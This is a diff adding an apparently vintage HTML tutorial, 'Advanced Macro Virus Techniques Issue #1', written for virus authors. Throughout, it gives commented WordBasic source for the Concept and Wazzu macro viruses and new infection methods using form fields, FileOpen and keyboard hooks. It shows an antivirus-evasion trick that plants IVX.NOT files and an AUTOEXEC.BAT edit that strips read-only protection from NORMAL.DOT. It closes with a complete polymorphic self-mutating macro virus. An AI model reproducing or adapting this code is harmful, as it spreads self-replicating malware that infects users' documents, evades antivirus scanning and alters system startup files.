@@ -1,0 +1,467 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Advanced Macro Virus Techniques #1</TITLE>
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+3>Advanced Macro Virus
+Techniques Issue #1<BR>
+</FONT><FONT SIZE=+2>by Alchemy</FONT></FONT></B> 
+<HR></P></CENTER>
+
+<UL>
+<PRE>If you want to send a comment or suggestion then post a message to
+alt.comp.virus, alt.comp.virus.source.code or to http://www.wcivr.com public
+message board. Or come to Undernet's #virus.
+              - Alchemy -
+
+We'll first take a look at Concept and Wazzu to learn the basics and learn
+some new techniques for using form fields and turning off read only NORMAL.DOT
+We'll also look at a not very well known technique, FileOpen.
+We'll look at true polymorphism for macro viruses.
+Also, some hints and tips.
+
+<B>*****
+I.  Here's Concept:
+*****
+
+</B>AutoOpen and AAAZAO:
+
+Sub MAIN
+        On Error Goto Abort
+        'If an error occurs, this bails out
+
+        iMacroCount = CountMacros(0, 0)
+        ' This counts the macros. The first 0 means the normal template and
+        ' the second 0 means not to include
+        ' built in commands. The second 0 could have been left out.
+        ' This value is stored in iMacroCount where the i stands for integer.
+
+        'see if we're already installed
+        For i = 1 To iMacroCount
+        ' This goes through each macro in the normal template.
+                If MacroName$(i, 0, 0) = &quot;PayLoad&quot; Then
+                ' If the macro being checked out has the name PayLoad, then
+                ' set bInstalled to -1, where b stands for boolean.
+                ' The i is the position, the 0 means the normal template, and
+                ' the second 0 means not to include internal commands.
+                ' The second 0 could have been left out.
+                        bInstalled = - 1
+                End If
+                If MacroName$(i, 0, 0) = &quot;FileSaveAs&quot; Then
+                ' Same as before.
+                        bTooMuchTrouble = - 1
+                End If
+        Next I
+
+        If Not bInstalled And Not bTooMuchTrouble Then
+                ' Runs the infection routine if it isn't already installed and
+                ' it isn't too much trouble.
+
+                'add FileSaveAs and copies of AutoOpen and FileSaveAs.
+                'PayLoad is just for fun.
+                iWW6IInstance = Val(GetDocumentVar$(&quot;WW6Infector&quot;))
+                ' This is supposed to be a generation counter but it doesn't
+                ' work.
+                sMe$ = FileName$()
+                ' This gets the name of the File in sMe$ where the s stands
+                ' for string.
+                sMacro$ = sMe$ + &quot;:Payload&quot;
+                MacroCopy sMacro$, &quot;Global:PayLoad&quot;
+                ' Copies Payload to global
+                sMacro$ = sMe$ + &quot;:AAAZFS&quot;
+                MacroCopy sMacro$, &quot;Global:FileSaveAs&quot;
+                ' copies AAAZFS to Global:FileSaveAs
+                sMacro$ = sMe$ + &quot;:AAAZFS&quot;
+                MacroCopy sMacro$, &quot;Global:AAAZFS&quot;
+                ' copies AAAZFS to global
+                sMacro$ = sMe$ + &quot;:AAAZAO&quot;
+                MacroCopy sMacro$, &quot;Global:AAAZAO&quot;
+                ' copies AAAZAO to global AAAZAO
+
+                SetProfileString &quot;WW6I&quot;, Str$(iWW6IInstance + 1)
+                ' This is also part of the generation counter which doesn't
+                ' work.
+
+                MsgBox Str$(iWW6IInstance + 1)
+                'This causes the message box with the 1 in it
+        End If
+Abort:
+End Sub
+
+FileSaveAs and AAAZFS:
+Sub MAIN
+'this becomes the FileSaveAs for the global template
+Dim dlg As FileSaveAs
+' Makes the variable dlg be able to save a FileSaveAs dialog
+On Error Goto bail
+' Bails out if there's an error.
+GetCurValues dlg
+' Get the current values of the FileSaveAs dialog
+Dialog dlg
+' Displays the dialog
+If dlg.Format = 0 Then dlg.Format = 1
+' If the user saved it as a word document, then save it as a template, which
+' can contain macros.
+sMe$ = FileName$()
+' Get the name of the file.
+sTMacro$ = sMe$ + &quot;:AutoOpen&quot;
+MacroCopy &quot;Global:AAAZAO&quot;, sTMacro$
+sTMacro$ = sMe$ + &quot;:AAAZAO&quot;
+MacroCopy &quot;Global:AAAZAO&quot;, sTMacro$
+sTMacro$ = sMe$ + &quot;:AAAZFS&quot;
+MacroCopy &quot;Global:AAAZFS&quot;, sTMacro$
+sTMacro$ = sMe$ + &quot;:PayLoad&quot;
+MacroCopy &quot;Global:PayLoad&quot;, sTMacro$
+' Do the copying
+FileSaveAs dlg
+' Do the actual saving
+Goto Done
+
+Bail:
+If Err &lt;&gt; 102 Then
+        FileSaveAs dlg
+End If
+' If the user didn't press cancel, then save the document even though it
+' couldn't be infected.
+Done:
+End Sub
+
+Payload:
+Sub MAIN
+        REM That's enough to prove my point
+End Sub
+' Here's one of the strangest macros. What is its purpose?
+' It's an infection marker but it's not necessary because Concept won't
+' reinfect because of the FileSaveAs macro.
+' What point is the author making?
+' Perhaps it was a Microsoft employee trying to prove to his superiors that
+' the Word Macro language was too powerful.
+' Perhaps someone trying to prove that a virus can infect a &quot;data file&quot;.
+' Perhaps someone trying to show that a certain antivirus program can't detect
+' all viruses.
+
+<B>*****
+II. Here's Wazzu:
+*****
+
+</B>Sub MAIN
+        On Error Goto errCaught
+        ' Bails out if an error
+        FileSummaryInfo .Update
+        ' Updates the FileSummaryInfo
+        Dim dlg As FileSummaryInfo
+        ' Prepares dlg for FileSummaryInfo
+        GetCurValues dlg
+        'Get the current values of the dialog.
+
+        fileMacro$ = dlg.Directory + &quot;\&quot; + dlg.FileName + &quot;:autoOpen&quot;
+        ' Adds the directory plus the filename plus the macro name
+        globMacro$ = &quot;Global:autoOpen&quot;
+        MacroFile$ = UCase$(Right$(MacroFileName$(MacroName$(0)), 10))
+        ' MacroName$(0) returns the most current macro
+        ' MacroFileName$ returns the file which contains it
+        ' Right$ returns the last 10 letters. &quot;NORMAL.DOT&quot; is 10 letters long.
+        ' Ucase$ converts it into uppercase
+
+        If MacroFile$ = &quot;NORMAL.DOT&quot; Then
+        ' If the macro that's running is in NORMAL.DOT, then it's time to
+        ' infect the file being opened.
+                MacroCopy globMacro$, fileMacro$
+                FileSaveAs .Format = 1
+        Else
+                MacroCopy fileMacro$, globMacro$
+        ' Otherwise, infect NORMAL.DOT
+        End If
+
+
+Goto bye
+errCaught:
+
+bye:
+        On Error Goto 0
+' Just junk. I cut out the payload because it isn't important.
+End Sub
+
+<B>*****
+III. Here's how to use Form Fields:
+*****
+
+</B>This is the first macro virus to use Form Fields except for Reflex, but:
+1. Only the AV have Reflex
+2. Reflex is too buggy to replicate
+
+Sub MAIN
+
+On Error Goto errcaught
+If UCase$(Right$(MacroFileName$(MacroName$(0)), 10)) = &quot;NORMAL.DOT&quot; Then
+' See Wazzu
+        For i = 1 To CountMacros(1)
+                If MacroName$(i, 1) = &quot;A&quot; Then installed = 1
+        Next I
+        ' See Concept
+        If installed = 0 Then
+                MacroCopy &quot;Global:AutoClose&quot;, WindowName$() + &quot;:A&quot;
+                ' WindowName$ acts like FileName$
+                FileSaveAs .Format = 1
+                InsertFormField .Entry = &quot;A&quot;, .Exit = &quot;&quot;, .Enable = 1,
+                .TextType = 0, .TextWidth = &quot;0&quot;, .TextDefault = &quot;&quot;,
+                .TextFormat = &quot;&quot;, .Type = 0, .OwnHelp = 0, .HelpText = &quot;&quot;,
+                .OwnStat = 0, .StatText = &quot;&quot;
+                ' This is one really long line.
+                ' Insert a form field and link it to the macro &quot;A&quot;
+        End If
+        ToolsProtectDocument .DocumentPassword = &quot;&quot;, .NoReset = 0, .Type = 2
+        ' Protect the document. Links to Form Fields don't work unless you
+        ' protect the document.
+Else
+        ToolsUnprotectDocument
+        ' When an infected document is opened, it needs to be unprotected so
+        ' the person can work on it.
+        MacroCopy WindowName$() + &quot;:A&quot;, &quot;Global:AutoClose&quot;
+        ' It needs to be protected again when the document is closed, so we
+        ' copy to AutoClose.
+End If
+errcaught:
+End Sub
+
+<B>*****
+IV. Security holes
+*****
+
+
+</B>1. Security hole in IVX.
+If a directory contains a file called IVX.NOT, the entire directory is
+skipped.
+See section VI for an example on how to use this.
+
+Sub AID(S$)
+        iv$ = FileNameInfo$(S$, 5) + &quot;IVX.NOT&quot;
+        Open iv$ For Output As #1
+        Close #1
+End Sub
+
+2. Security hole that allows a virus to disable read-only.
+A virus can't turn off the read only attribute while it's running,
+so it needs to be done indirectly.
+
+Sub ANDROID
+        nd$ = DefaultDir$(2)
+        Open &quot;C:\AUTOEXEC.BAT&quot; For Input As #1
+        While Not Eof(1)
+                Line Input #1, y$
+                If InStr(y$, nd$) &lt;&gt; 0 Then r = - 1
+        Wend
+        Close #1
+
+        If Not r Then
+                nd$ = nd$ + &quot;\NORMAL.DOT&quot;
+                Open &quot;C:\AUTOEXEC.BAT&quot; For Append As #1
+                Print #1, &quot;@ATTRIB -R &quot; + ND$ + &quot; &gt; NUL&quot;
+                Close #1
+        End If
+End Sub
+
+See the polymorphic macro virus later on for an example of how to use them.
+
+<B>*****
+V. How to use FileOpen
+*****
+
+
+</B>Sub Main
+' This macro is fairly self explanatory. Just check out wazzu or Concept if
+' you're not sure about some command.
+Already = 0
+For j = 1 To CountMacros(0, 0)
+        If MacroName$(j, 0, 0) = &quot;FileOpen&quot; Then Already = 1
+Next j
+If already = 0 Then MacroCopy FileName$() + &quot;:FileOpen&quot;, &quot;Global:FileOpen&quot;
+Dim dlg As FileOpen
+GetCurValues dlg
+Dialog dlg
+FileOpen dlg
+Dim DlgFS As FileSaveAs
+GetCurValues DlgFS
+DlgFS.Format = 1
+Already = 0
+For j = 1 To CountMacros(1, 0)
+        If MacroName$(j, 1, 0) = &quot;FileOpen&quot; Then Already = 1
+Next j
+If already = 0 Then MacroCopy &quot;Global:FileOpen&quot;, FileName$() + &quot;:FileOpen&quot;
+FileSaveAs DlgFS
+End Sub
+
+<B>*****
+VI. Polymorphism
+*****
+
+</B>By using ToolsMacro .Edit, one can get full polymorphism.
+You can't edit a macro while it's running.
+
+-You could insert random strings or numbers.
+-You could change case.
+-You could use a different form of command depending on rnd().
+-You could use search and replace.
+-You could add a random amount of enters.
+
+Here's an example virus of these techniques.
+
+Sub MAIN
+On Error Goto Abort
+For i = 1 To CountMacros(0)
+        If MacroName$(i, 0) = &quot;FileSaveAs&quot; Then b = - 1
+Next i
+If Not b Then
+        DisableInput
+        ToolsOptionsSave .GlobalDotPrompt = 0
+        ScreenUpdating 0
+        jqp$ = FileName$()
+        MacroCopy jqp$ + &quot;:AutoOpen&quot;, &quot;Global:GGMZW&quot;
+        ToolsMacro .Name = &quot;GGMZW&quot;, .Edit, .Show = 0
+        EditReplace .Find = &quot;GGMZW&quot;, .Replace = junk$(0), .Direction = 0,
+        .MatchCase = 0, .WholeWord = 0, .PatternMatch = 0, .SoundsLike = 0,
+        .ReplaceAll, .Format = 0, .Wrap = 1
+        ' This is one long line
+        EditReplace .Find = &quot;jqp$&quot;, .Replace = junk$(1), .Direction = 0,
+        .MatchCase = 0, .WholeWord = 0, .PatternMatch = 0, .SoundsLike = 0,
+        .ReplaceAll, .Format = 0, .Wrap = 1
+        ' This is one long line
+        EditSelectAll
+        FormatChangeCase .Type = Int(Rnd() * 5)
+        StartOfDocument
+        ParaDown Int(Rnd() * 50) + 1
+        Insert &quot;'1 Gen&quot;
+        InsertPara
+        DocClose 1
+
+        ToolsMacro .Name = &quot;FileSaveAs&quot;, .Edit, .Show = 0
+        StartOfLine
+        LineUp 1
+        pmorf(&quot; on error goto abort &quot;)
+        LineDown 1
+        pmorf(&quot; dlg.format = 1 &quot;)
+        pmorf(&quot; jqp$ = filename$ ( ) &quot;)
+        Insert &quot;macrocopy &quot; + Chr$(34) + &quot;Global:GGMZW&quot; + Chr$(34) +
+        &quot;,jqp$+&quot; + Chr$(34) +      &quot;:AutoOpen&quot; + Chr$(34)
+        'This is one long line
+        InsertPara
+        LineDown 1
+        pmorf(&quot;abort: &quot;)
+        DocClose 1
+
+        ANDROID
+End If
+AID(jqp$)
+Abort:
+End Sub
+
+Function junk$(yesno)
+        For i = 1 To Int(Rnd() * 6) + 6
+                x$ = Chr$(Int(Rnd() * 26) + 97)
+                If Rnd() &gt; 0.5 Then x$ = UCase$(x$)
+                bit$ = bit$ + x$
+        Next i
+        If yesno = 1 Then bit$ = bit$ + &quot;$&quot;
+        junk$ = bit$
+End Function
+
+Sub AID(S$)
+        iv$ = FileNameInfo$(S$, 5) + &quot;IVX.NOT&quot;
+        Open iv$ For Output As #1
+        Close #1
+End Sub
+
+Sub ANDROID
+        nd$ = DefaultDir$(2)
+        Open &quot;C:\AUTOEXEC.BAT&quot; For Input As #1
+        While Not Eof(1)
+                Line Input #1, y$
+                If InStr(y$, nd$) &lt;&gt; 0 Then r = - 1
+        Wend
+        Close #1
+
+        If Not r Then
+                nd$ = nd$ + &quot;\NORMAL.DOT&quot;
+                Open &quot;C:\AUTOEXEC.BAT&quot; For Append As #1
+                Print #1, &quot;@ATTRIB -R &quot; + ND$ + &quot; &gt; NUL&quot;
+                Close #1
+        End If
+End Sub
+
+Sub pmorf(t$)
+        For i = 1 To Len(t$)
+                If Mid$(t$, i, 1) = &quot; &quot; Then
+                        u$ = u$ + String$(Int(Rnd() * 5) + 1, &quot; &quot;)
+                Else
+                        u$ = u$ + Mid$(t$, i, 1)
+                End If
+        Next i
+        u$ = u$ + &quot;'&quot; + junk$(0)
+        Insert u$
+        For i = 1 To Int(Rnd() * 5) + 1
+                InsertPara
+        Next i
+End Sub
+
+<B>*****
+VII. Something annoying
+*****
+</B>Sometimes I see this:
+
+i=CountMacros(0,0)
+If i&lt;&gt;0 Then '*
+        For j=1 To i
+        If MacroName$(j,0,0) = ...
+        Next J
+        ...
+End If '*
+
+This is code to see if NORMAL.DOT is already infected.
+The probem is the lines marked with '*
+They're totally unnecessary. If to initial value of a for loop is false, then
+it's skipped, which is what you wanted.
+
+<B>*****
+VIII. Helpful hint
+*****
+
+</B>If you're trying to do something but can't figure out how, try the macro
+recorder and then examine the output. Or you could try the very good help
+file. It even comes with examples.
+
+<B>*****
+IX. How to link a macro to a key.
+*****
+
+</B>In this example, we link the macro &quot;y&quot; to the key Page Down.
+
+Sub MAIN
+On Error Goto errCaught
+f$ = FileName$() + &quot;:y&quot;
+g$ = &quot;Global:y&quot;
+If UCase$(Right$(MacroFileName$(MacroName$(0)), 10)) = &quot;NORMAL.DOT&quot; Then
+        MacroCopy g$, f$
+        ToolsCustomizeKeyboard .KeyCode = 34, .Category = 2, .Name = &quot;y&quot;,
+        .Add, .Context = 1
+        'This is one long line
+        '34 is the KeyCode for Page Down
+        FileSaveAs .Format = 1
+Else
+        MacroCopy f$, g$
+        ToolsCustomizeKeyboard .KeyCode = 34, .Category = 2, .Name = &quot;y&quot;,
+        .Add, .Context = 0
+        ' This is one long line
+End If
+errcaught:
+End Sub</PRE>
+</UL>
+
+<PRE>
+<HR WIDTH="100%">
+</PRE>
+
+</BODY>
+</HTML>
